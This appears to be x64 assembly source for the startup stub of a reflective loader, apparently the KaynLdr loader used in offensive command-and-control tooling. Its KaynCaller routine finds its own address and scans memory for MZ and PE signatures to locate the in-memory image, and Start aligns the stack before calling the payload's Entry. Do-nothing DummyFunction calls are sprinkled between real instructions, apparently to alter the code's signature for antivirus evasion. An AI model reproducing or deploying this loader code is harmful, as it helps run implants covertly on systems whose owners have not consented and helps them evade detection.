extern Entry

global Start
global GetRIP
global KaynCaller


; Define the dummy function
DummyFunction:
        ; Save registers (if needed)
        push    rax
        push    rbx
        push    rcx
        push    rdx

        ; Dummy operations
        nop     ; No operation
        nop     ; No operation
        nop     ; No operation

        ; Restore registers
        pop     rdx
        pop     rcx
        pop     rbx
        pop     rax

        ; Return from the dummy function
    ret



section .text$A
	Start:
        call    DummyFunction
        push    rsi
        nop
        mov		rsi, rsp
        call    DummyFunction
        and		rsp, 0FFFFFFFFFFFFFFF0h
        call    DummyFunction
        sub		rsp, 020h
        call    Entry

        mov		rsp, rsi
        pop		rsi
    ret



section .text$F
    KaynCaller:
           call caller
       caller:
           pop rcx
       loop:
           xor rbx, rbx
           mov ebx, 0x5A4D
           inc rcx
           cmp bx,  [ rcx ]
           jne loop
           xor rax, rax
           mov ax,  [ rcx + 0x3C ]
           add rax, rcx
           xor rbx, rbx
           add bx,  0x4550
           cmp bx,  [ rax ]
           jne loop
           mov rax, rcx
       ret

    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret
